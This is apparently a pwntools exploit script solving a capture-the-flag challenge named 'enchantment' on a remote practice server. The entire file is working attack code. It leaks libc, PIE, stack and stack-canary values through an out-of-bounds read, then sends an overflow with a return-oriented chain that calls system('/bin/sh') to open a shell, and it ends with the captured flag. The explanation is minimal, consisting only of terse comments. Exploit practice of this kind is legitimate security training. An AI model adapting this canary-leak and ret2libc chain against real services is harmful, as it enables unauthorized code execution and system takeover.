from pwn import *

#gadgets
pop_rdi = 0x00000000000015e3
ret = 0x000000000000101a

#defines
STRCPY_OFFSET = -0xe0
PIE_LEAK_OFFSET = -0x58
ENVIRON_OFFSET = 0x00000000001ef600
LOCKET_OFFSET = 0x4060
CANARY_OFFSET = 0x1f35e8
PADDING = 0x18
BINSH = 0x1b45bd
SYSTEM_OFFSET = 0x0000000000052290

def arbitrary_read(p: process, offset: int):
    p.sendline("check " + str(offset))
    return p.recvuntil(">")[1:-2]

def leak_libc(p: process):
    data = b""
    for i in range(8):
        data += arbitrary_read(p, STRCPY_OFFSET + i)
    libc = int.from_bytes(data, 'little') - 0x189c10
    print("libc: ", hex(libc))
    return libc

def leak_pie(p: process):
    data = b""
    for i in range(8):
        data += arbitrary_read(p, PIE_LEAK_OFFSET + i)
    pie = int.from_bytes(data, 'little') - 0x4008
    print("PIE: ", hex(pie))
    return pie

def leak_stack(p: process, libc: int, pie: int):
    environ = libc + ENVIRON_OFFSET
    env_offset = environ - (pie + LOCKET_OFFSET)
    data = b""
    for i in range(8):
        data += arbitrary_read(p, env_offset + i)
    stack = int.from_bytes(data, 'little')
    print("stack: ", hex(stack))
    return stack

def leak_canary(p: process, libc: int, pie: int):
    canary_base = libc + CANARY_OFFSET
    canary_offset = canary_base - (pie + LOCKET_OFFSET)
    data = b""
    for i in range(8):
        data += arbitrary_read(p, canary_offset + i)
    print("canary: ", hex(int.from_bytes(data, 'little')))
    return data


def main():
    ### run ###
    #p = process("./enchantment")
    p = remote("pwnable.co.il", 9017)
    p.recvuntil(">")

    ### leaks ###
    libc = leak_libc(p)
    pie = leak_pie(p)
    stack = leak_stack(p, libc, pie)
    canary = leak_canary(p, libc, pie)

    ### start payload ###
    payload = PADDING * b"a"
    payload += canary
    payload += b"b" * 8
    payload += p64(pie + ret)
    payload += p64(pie + pop_rdi)
    payload += p64(libc + BINSH)
    payload += p64(libc + SYSTEM_OFFSET)  
    #sleep(10)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()

#flag: PWNIL{unleashing_the_hidden_powers_of_the_enchantment}
#Note: it works but somtimes fail